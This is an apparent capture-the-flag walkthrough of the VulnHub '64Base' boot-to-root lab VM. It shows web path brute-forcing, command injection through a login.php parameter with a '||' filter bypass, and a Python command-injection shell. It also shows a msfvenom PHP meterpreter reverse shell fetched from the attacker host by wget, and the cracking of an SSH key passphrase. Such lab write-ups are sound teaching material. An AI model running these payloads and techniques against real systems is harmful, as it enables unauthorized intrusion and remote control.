## 64Base: 1.0.1

### Info

```
64Base Boot2Root

This is my very first public Boot2Root, It’s intended to be more of a fun game than a serious hacking challenge. Hopefully anyone interested enough to give it a try will enjoy the story with this one.

It is based on the StarWars storyline and is designed to Troll you in a fun way.

Just be warned, it’s littered with more than a few “Red Herrings” ;D
Difficulty Rating

[BEGINNER - INTERMEDIATE]
Capture The Flags

There are 6 flags to collect. Each in the format of flag1{ZXhhbXBsZSBmbGFnCg==} Beat the Empire and steal the plans for the Death Star before its too late.

I Hope You Enjoy It.

v1.0 - 05/12/2016 v1.0.1 - 07/12/2016

https://www.vulnhub.com/entry/64base-101,173/
```

If the name is anything to go off, i have a feeling that there will be a lot of base46 strings. in preparation for this, i've made the following script to try and make life easier.

```python
#!/usr/bin/env python

import base64

while True:
    string = raw_input('String: ' ).strip()
    print base64.decodestring(string)
```

## Initial discovery

I'll use `netdiscover` to identify the IP and then use `nmap` to scan for open ports/services.

```bash
netdiscover -r 192.168.93.0/24
 Currently scanning: 192.168.93.0/24   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.174  00:0c:29:33:1c:a6      1      60  VMware, Inc.
 192.168.93.254  00:50:56:fe:23:7c      1      60  VMware, Inc.
```

```bash
nmap -Pn -sV -p- 192.168.93.174

Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-20 16:43 GMT
Nmap scan report for 192.168.93.174
Host is up (0.00013s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
4899/tcp  open  radmin?
62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
```

Apache on port 80
ssh on port 62964
radmin on port 4899


## Radmin

Never heard of that service, lets see if `amap` agrees with `nmap`.

```bash
amap 192.168.93.174 4899
amap v5.4 (www.thc.org/thc-amap) started at 2016-12-20 16:46:20 - APPLICATION MAPPING mode

Unrecognized response from 192.168.93.174:4899/tcp (by trigger http) received.
Please send this output and the name of the application to vh@thc.org:
0000:  7373 6868 6821 2073 7368 2120 6472 6f69    [ sshhh! ssh! droi ]
0010:  6473 210a 0a0a 0a0a 0a0a 0a0a 0a0a 0a0a    [ ds!............. ]
0020:  0a0a 0a0a 0a0a 0a0a 0a0a 0a0a 0a0a 0a0a    [ ................ ]
0030:  0a0a 0a0a 0a0a 0a0a 0a0a 0a0a 0a0a 0a0a    [ ................ ]
0040:  0a0a 0a0a 0a0a 0a0a 0a0a 0a53 6f2e 2e0a    [ ...........So... ]
0050:  0a59 6f75 2066 6f75 6e64 2061 2077 6179    [ .You found a way ]
0060:  2069 6e20 7468 656e 2e2e 2e0a 0a62 7574    [  in then.....but ]

..Snip..
```

Connecting to it shows the following

```
nc 192.168.93.174 4899

sshhh! ssh! droids!

So..

You found a way in then...

but, can you pop root?



                                           /~\
                                          |oo )    Did you hear that?
                                          _\=/_
                          ___            /  _  \
                         / ()\          //|/.\|\\
                       _|_____|_        \\ \_/  ||
                      | | === | |        \|\ /| ||
                      |_|  O  |_|        # _ _/ #
                       ||  O  ||          | | |
                       ||__*__||          | | |
                      |~ \___/ ~|         []|[]
                      /=\ /=\ /=\         | | |
      ________________[_]_[_]_[_]________/_]_[_\_________________________

```

Nice ! Lets come back to this one

## Apache

Running `uniscan` on the web page shows loads of entries in the `robots.txt`. I'll download it and use it as a wordlist.

```bash
curl http://192.168.93.174/robots.txt | cut -d ':' -f 2 | tr -d '/' | tee -a wordlist.txt
```

just to be on the safe side of things

```bash
wc -l wordlist.txt
430 wordlist.txt

cat wordlist.txt| sort -u | wc -l
430
```

```
dirb http://192.168.93.174 -w ./wordlist.txt
```

hmmmm not getting far with the `dirb`, however i did find the first flag

### Flag1

```python
#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup, Comment
import base64


r = requests.get('http://192.168.93.174')

source_code = r.text
soup = BeautifulSoup(source_code, 'lxml')

for comments in soup.findAll(text=lambda text:isinstance(text, Comment)):
    try:
        string = comments.extract().decode('hex')
        print base64.decodestring(string)
    except:
        pass
```

```
python flag1.py
flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}
```

decoding the flag gives us

```
String: NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==
64base:Th353@r3N0TdaDr01DzU@reL00K1ing4
```

## Back to Apache

Because `dirb` gave 200 codes for every entry, i decided to use `wfuzz` excluding matches for 200 and 404 codes

And we have a hit

```bash
wfuzz -c -w /root/wordlist.txt  --hc 200,404 http://192.168.93.174/FUZZ/
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.93.174/FUZZ/
Total requests: 430

==================================================================
ID      Response   Lines      Word         Chars          Request
==================================================================

00000:  C=401     14 L        54 W          461 Ch        "admin"

Total time: 0.811131
Processed Requests: 430
Filtered Requests: 429
Requests/sec.: 530.1239
```

### /admin/

The credentials from flag1 did not work here, so its back to the root of the web app.

### Back To Apache

4 pages that i see i can use to make a wordlist from

- http://192.168.93.174/index.html
- http://192.168.93.174/about.html
- http://192.168.93.174/post.html
- http://192.168.93.174/contact.html

so lets try this, i'm going to get some errors, but at a first path i'll give it a shot.

```bash
for x in 'index' 'about' 'post' 'contact' ; do curl http://192.168.93.174/$x.html | html2markdown | tr -s ' ' '\n' >> webapp.txt ; done
```

so would you look at that it worked.

```bash
wfuzz -c -z file,/root/webapp.txt  --hc 404,301,200  http://192.168.93.174/FUZZ
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.93.174/FUZZ
Total requests: 2862

==================================================================
ID      Response   Lines      Word         Chars          Request
==================================================================

02708:  C=401     14 L        54 W          461 Ch        "Imperial-Class"

Total time: 3.799878
Processed Requests: 2862
Filtered Requests: 2861
Requests/sec.: 753.1819
```

### Imperial-Class

This page requires auth (identified by the http status code) so i'll pass the creds we have from flag1

```html
curl -u '64base:Th353@r3N0TdaDr01DzU@reL00K1ing4' http://192.168.93.174/Imperial-Class/
<!DOCTYPE html>
<html lang="en">
<body bgcolor=#000000><font color=#cfbf00>
<title>64base - login</title>
<h3>[☠] ERROR: incorrect path!.... TO THE DARK SIDE!</h3>
<!-- don't forget the BountyHunter login -->
```

err ok then

```html
curl -u '64base:Th353@r3N0TdaDr01DzU@reL00K1ing4' http://192.168.93.174/Imperial-Class/BountyHunter/
<body bgcolor=#000000><font color=#cfbf00>
<form name="login-form" id="login-form" method="post" action="./login.php">
  <fieldset>
  <legend>Please login:</legend>
  <dl>
    <dt>
      <label title="Username">Username:
      <input tabindex="1" accesskey="u" name="username" type="text" maxlength="50" id="username" />
      </label>
    </dt>
  </dl>
  <dl>
    <dt>
      <label title="Password">Password:
      <input tabindex="2" accesskey="p" name="password" type="password" maxlength="15" id="password" />
      </label>
    </dt>
  </dl>
  <dl>
    <dt>
      <label title="Submit">
      <input tabindex="3" accesskey="l" type="submit" name="cmdlogin" value="Login" />
      </label>
    </dt>
  </dl>
  </fieldset>
</form>
```

further playing with authentication twice, i finally get the following interesting output

```html
curl -i -s -k  -H $'Authorization: Basic NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0' 'http://192.168.93.174/Imperial-Class/BountyHunter/index.php'                                                                                                                                   HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 19:49:37 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<body bgcolor=#000000><font color=#cfbf00>
<form name="login-form" id="login-form" method="post" action="./login.php">
  <fieldset>
  <legend>Please login:</legend>
  <dl>
    <dt>
      <label title="Username">Username:
      <input tabindex="1" accesskey="u" name="function" type="text" maxlength="50" id="5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756" />
      </label>
    </dt>
  </dl>
  <dl>
    <dt>
      <label title="Password">Password:
      <input tabindex="2" accesskey="p" name="command" type="password" maxlength="15" id="584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32" />
            </label>
    </dt>
  </dl>
  <dl>
    <dt>
      <label title="Submit">
      <input tabindex="3" accesskey="l" type="submit" name="cmdlogin" value="Login" />
      <!-- basictoken=52714d544a54626d51315a45566157464655614446525557383966516f3d0a -->
      </label>
    </dt>
  </dl>
  </fieldset>
</form>
```

### Flag 2

very poor script but it done the job

```python
#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup, Comment

headers = {'Authorization':'Basic NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0'}
r = requests.get('http://192.168.93.174/Imperial-Class/BountyHunter/index.php', headers=headers)

source_code = r.text
soup = BeautifulSoup(source_code, 'lxml')

ids = soup.find_all('input')
id1 = str(ids).split('=')[2].split('maxlength')
id2 = str(ids).split('=')[8].split('maxlength')
for comments in soup.findAll(text=lambda text:isinstance(text, Comment)):
    hexcomment = comments.split('basictoken=')[1].strip()
    id3 = hexcomment


print id1
print id2
print id3

together = '5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c3252714d544a54626d51315a45566157464655614446525557383966516f3d0a'

hextogether =  together.decode('hex')
print hextogether.decode('base64')
```

Decoding the flag

```
String: aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=
https://www.youtube.com/watch?v=vJwytFWA8uA
```


## Apache again

`dirb` gave `/cat/`


```bash
curl -i -s -k  -H $'Authorization: Basic NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0' 'http://192.168.93.174/Imperial-Class/BountyHunter/cat'
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 21:21:52 GMT
Server: Apache/2.4.10 (Debian)
Last-Modified: Mon, 05 Dec 2016 23:42:32 GMT
ETag: "811-542f1d76de3c0"
Accept-Ranges: bytes
Content-Length: 2065

#!/bin/bash
echo '''
   ▄                   ▄██▄
  ▐██▄                ▄█░░█▌
  ▐█░██▄             ██░░░█▌
  ▐█░░░██           ██░░░░█
   █░░░░██▄████████▄███░░░█
   ██░░█░░░░░░░░░░░░░░░█░██
    ███░░░░░░░░░░░░░░░░░██
    ██░░░░░░░░░░░░░░░░░░░█
   ▐█░░░░░░▄▄█░░█▄▄░░░░░░█▌
   ▐█░░░██████░░██████░░░█▌
   ██░░███████░░███████░░██
   ██░░█▄▐█▌▐█░░█▌▐█▌▄█░░██
   ██░░██▄▄▄██░░██▄▄▄██░░██▌
  ▐█▌░░▀█████▀░░▀█████▀░░▐█▌
  ▐█▌░░░░▀█▀░░░░░░▀█▀░░░░▐█▌
  ██░░░░░░░░░▀▄▄▀░░░░░░░░░██
  ██░░░░░░░▀▄░▐▌░▄▀░░░░░░░██
  █▌░░░░░░░░░▀▀▀▀░░░░░░░░░▐█
 ██░░░░░░░░░░░░░░░░░░░░░░░▐█▌
██░░░░░░░░░░░░░░░░░░░░░░░░░██
█▌░░░░░░░░░░░░░░░░░░░░░░░░░▐█

Is this the cat you were looking for?


look UP ssh port
```

well that was a rabbit hole

lets brute force this once again ....

```bash
wfuzz -c -w /opt/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt  --hc 404,403  --basic 64base:Th353@r3N0TdaDr01DzU@reL00K1ing4 http://192.168.93.174/Imperial-Class/BountyHunter/FUZZ
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.93.174/Imperial-Class/BountyHunter/FUZZ
Total requests: 37037

==================================================================
ID      Response   Lines      Word         Chars          Request
==================================================================

00001:  C=200     28 L        60 W          959 Ch        "index.php"
00009:  C=302      2 L         1 W           93 Ch        "login.php"
00168:  C=200     10 L       171 W         1106 Ch        "license.txt"
00315:  C=000     27 L        57 W          757 Ch        "."
01558:  C=200     27 L        57 W          757 Ch        "index.html"
37036:  C=404      9 L        32 W          318 Ch        "Bahamas.html"
```

`login.php` is a new one.. lets have a look

### Flag 3


```bash
#!/bin/bash

curl -H 'Authorization: Basic NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0' 'http://192.168.93.174/Imperial-Class/BountyHunter/login.php'
```

```
bash ./flag3.sh

flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}
```

```
String: NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=
53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&c=id
```

now i feel like we are getting somewhere

ok `exec` wont be of any use, trying `system` works and give the 4th flag.

### Flag 4

```bash
curl -u '64base:Th353@r3N0TdaDr01DzU@reL00K1ing4' 'http://192.168.93.174/Imperial-Class/BountyHunter/login.php?f=system&c=id'
<body bgcolor=#000000><font color=#cfbf00> <h2>[64base Command Shell]</h2> <pre>
<h4>flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}</h4>
Debian GNU/Linux 8 \n \l

Tue Dec 20 22:05:44 GMT 2016
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
          inet addr:192.168.93.174  Bcast:192.168.93.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe33:1ca6/64 Scope:Link

uid=1001(64base) gid=1001(64base) groups=1001(64base)
```

decoding the flag

```
String: NjRiYXNlOjY0YmFzZTVoMzc3Cg==
64base:64base5h377
```

more credentials

## Code Execution

playing around with the url for a bit i noticed that there was filter on the `c` parameter that was causing some issues, because of this i escaped the command with `||` and commands after that executed fine.


i made the following 'fake shell' so it would be easier to enumerate the host, and hope to get a full shell.

```python
#!/usr/bin/env python

import requests

url = 'http://192.168.93.174/Imperial-Class/BountyHunter/login.php?f=system&c=||'

while True:
    command = raw_input('$ ')
    r = requests.get(url+command, auth=('64base', 'Th353@r3N0TdaDr01DzU@reL00K1ing4'))
    print r.text
```


```
msfpc php

[i]   IP: 192.168.93.170
 [i] PORT: 443
 [i] TYPE: php (php/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p php/meterpreter/reverse_tcp -f raw \
  --platform php -e generic/none -a php LHOST=192.168.93.170 LPORT=443 \
  > '/root/php-meterpreter-staged-reverse-tcp-443.php'

 [i] php meterpreter created: '/root/php-meterpreter-staged-reverse-tcp-443.php'

 [i] MSF handler file: '/root/php-meterpreter-staged-reverse-tcp-443-php.rc'
 [i] Run: msfconsole -q -r '/root/php-meterpreter-staged-reverse-tcp-443-php.rc'

```

```
mv php-meterpreter-staged-reverse-tcp-443.php Downloads ; cd $_
python -m SimpleHTTPServer 80
```

```bash
wget -r 192.168.93.170 -O shell.php
<body bgcolor=#000000><font color=#cfbf00> <h2>[64base Command Shell]</h2> <pre>
<h4>flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}</h4>
Debian GNU/Linux 8 \n \l

Tue Dec 20 23:26:48 GMT 2016
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
          inet addr:192.168.93.174  Bcast:192.168.93.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe33:1ca6/64 Scope:Link
```

```
192.168.93.174 - - [22/Dec/2016 19:35:33] "GET / HTTP/1.1" 200 -
192.168.93.174 - - [22/Dec/2016 19:35:33] code 404, message File not found
192.168.93.174 - - [22/Dec/2016 19:35:33] "GET /robots.txt HTTP/1.1" 404 -
192.168.93.174 - - [22/Dec/2016 19:35:33] "GET /php-meterpreter-staged-reverse-tcp-443.php HTTP/1.1" 200 -
```

```bash

$ ls
<body bgcolor=#000000><font color=#cfbf00> <h2>[64base Command Shell]</h2> <pre>
<h4>flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}</h4>
Debian GNU/Linux 8 \n \l

Tue Dec 20 23:26:52 GMT 2016
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
          inet addr:192.168.93.174  Bcast:192.168.93.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe33:1ca6/64 Scope:Link
cat
css
index.html
index.html.1
index.jade
index.php
js
license.txt
login.php
scss
shell.php

$
```

```
msfconsole -q -r '/root/php-meterpreter-staged-reverse-tcp-443-php.rc'
[*] Processing /root/php-meterpreter-staged-reverse-tcp-443-php.rc for ERB directives.
resource (/root/php-meterpreter-staged-reverse-tcp-443-php.rc)> use exploit/multi/handler
resource (/root/php-meterpreter-staged-reverse-tcp-443-php.rc)> set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
resource (/root/php-meterpreter-staged-reverse-tcp-443-php.rc)> set LHOST 192.168.93.170
LHOST => 192.168.93.170
resource (/root/php-meterpreter-staged-reverse-tcp-443-php.rc)> set LPORT 443
LPORT => 443
resource (/root/php-meterpreter-staged-reverse-tcp-443-php.rc)> set ExitOnSession false
ExitOnSession => false
resource (/root/php-meterpreter-staged-reverse-tcp-443-php.rc)> run -j
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.93.170:443
[*] Starting the payload handler...
msf exploit(handler) >
```

alright we look ready to go

```bash
curl -u 64base:Th353@r3N0TdaDr01DzU@reL00K1ing4 'http://192.168.93.174/Imperial-Class/BountyHunter/shell.php'
```

```
[*] Started reverse TCP handler on 192.168.93.170:443
[*] Starting the payload handler...
[*] Sending stage (34117 bytes) to 192.168.93.174
[*] Meterpreter session 1 opened (192.168.93.170:443 -> 192.168.93.174:42471) at 2016-12-22 19:39:37 +0000
```

oh yeah!!

```
meterpreter > shell
Process 8150 created.
Channel 0 created.

python -c 'import pty;pty.spawn("/bin/bash")'
www-data@64base:~/html/Imperial-Class/BountyHunter$
```

## Elevation


### Flag5

```
www-data@64base:~/html/admin/S3cR37$ ls
ls
flag5{TG9vayBJbnNpZGUhIDpECg==}
```

Decoded to

```
String: TG9vayBJbnNpZGUhIDpECg==
Look Inside! :D
```

Fair enough

```bash
www-data@64base:~/html/admin/S3cR37$ file ./f*
file ./f*
./flag5{TG9vayBJbnNpZGUhIDpECg==}: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "4c5330744c5331435255644a546942535530456755464a4a566b4655525342", baseline, precision 8, 960x720, frames3
```

oh boy.


here goes

```
www-data@64base:~/html/admin/S3cR37$ python -m SimpleHTTPServer 8080
python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
^Nz192.168.93.170 - - [20/Dec/2016 23:51:54] "GET /flag5%7BTG9vayBJbnNpZGUhIDpECg==%7D HTTP/1.1" 200 -
```

ok [here](http://www.sno.phy.queensu.ca/~phil/exiftool/) says `exiftool` may do the trick.

```bash
exiftool -Comment ./flag5\{TG9vayBJbnNpZGUhIDpECg==\} | cut -d ':' -f 2 | xxd -r -p | base64 -d
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C

mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
-----END RSA PRIVATE KEY-----
```

Ok ok well that was not as hard as i expected.

## Access

```bash
chmod 600 ./privkey
ssh -p 62964 192.168.93.174 -l 64base -i ./privkey
Enter passphrase for key './privkey':
Enter passphrase for key './privkey':
Enter passphrase for key './privkey':
64base@192.168.93.174's password:
```

hmmmmmmm

so this like like i should give it a go [http://leidecker.info/projects/phrasendrescher/index.shtml](http://leidecker.info/projects/phrasendrescher/index.shtml)

```
pd pkey -d /usr/share/wordlists/rockyou.txt -K ./privkey
phrasen|drescher 1.2.2b - the passphrase cracker
Copyright (C) 2008 Nico Leidecker; http://www.leidecker.info

password for ./privkey: usetheforce
```

### Flag 6

```bash
ssh -p 62964 192.168.93.174  -i ./privkey
Enter passphrase for key './privkey':

Last login: Wed Dec 21 01:16:02 2016 from 192.168.93.170

flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}
```

decoding the flag

```bash
echo 'NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiM
zM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTY
zMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK' | base64 -d | xxd -r -p | base64 -d | xxd -r -p | base64 -d
```

```bash
base64 -d /var/local/.luke|less.real
```

ok then

```
____________________________________________________________________________

  ______  ______  ______  ______  ______  ______  ______  ______
 |______||______||______||______||______||______||______||______||______|
  _   _   ____ __          __ __     __ ____   _    _  _  _____   ______
 | \ | | / __ \\ \        / / \ \   / // __ \ | |  | |( )|  __ \ |  ____|
 |  \| || |  | |\ \  /\  / /   \ \_/ /| |  | || |  | ||/ | |__) || |__
 | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  __|
 | |\  || |__| |  \  /\  /       | |  | |__| || |__| |   | | \ \ | |____
 |_| \_| \____/    \/  \/        |_|   \____/  \____/    |_|  \_\|______|
                                _  ______  _____  _____  _
             /\                | ||  ____||  __ \|_   _|| |
            /  \               | || |__   | |  | | | |  | |
           / /\ \          _   | ||  __|  | |  | | | |  | |
          / ____ \        | |__| || |____ | |__| |_| |_ |_|
         /_/    \_\        \____/ |______||_____/|_____|(_)
  ______  ______  ______  ______  ______  ______  ______  ______  ______
 |______||______||______||______||______||______||______||______||______|


                    I hope you enjoyed this challenge
                    Please leave comments & feedback
                    @ https://www.vulnhub.com/?q=64base
                    -----------------------------------
                    64Base Challenge by 3mrgnc3
                    https://3mrgnc3.ninja/challenges
                    -----------------------------------


```

screenshot proof

![](uploads/images/64base-root.png)
